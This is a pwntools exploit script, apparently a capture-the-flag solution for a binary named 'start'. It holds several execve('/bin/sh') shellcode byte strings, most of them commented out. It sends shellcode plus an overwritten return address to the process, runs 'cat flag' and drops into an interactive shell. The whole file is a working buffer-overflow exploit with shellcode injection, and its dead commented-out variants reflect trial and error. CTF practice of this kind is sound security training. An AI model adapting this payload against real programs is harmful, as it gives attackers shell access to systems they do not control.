from pwn import *

PADDING = b"\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x90\x90"

#PADDING = b"\x59\x5C\x31\xc9\x6a\x3b\x58\x51\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
#PADDING = b"\x59\x5C\x6a\x0b\x58\x53\x68\x2f\x6C\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
PADDING = b"\x59\x5A\x5A\x5C\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
PADDING = b"\x31\xC9\x31\xD2\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

def main():
    p = process("./start")

    payload = PADDING
    payload += p32(0x0804809C)#p32(0x08048091)#p32(0x0804808B)#p32(0x8048099
    payload += b'\x64'
    #payload += cyclic(20)
    #payload += p32(0x08048060)
    #payload += b'b' * 20
    #payload += p32(0x0804808B)#p32(0x08048091)#p32(0x0804808B)#p32(0x8048099
    #payload += b'c' * 20
    #payload += b'a' * 4#PADDING
    #payload += p32(0x08048066)
    #payload += PADDING
    with open("p", "wb") as f:
        f.write(payload)
    p.sendline(payload)
    p.sendline(b"cat flag")
    p.interactive()

if __name__ == "__main__":
    main()
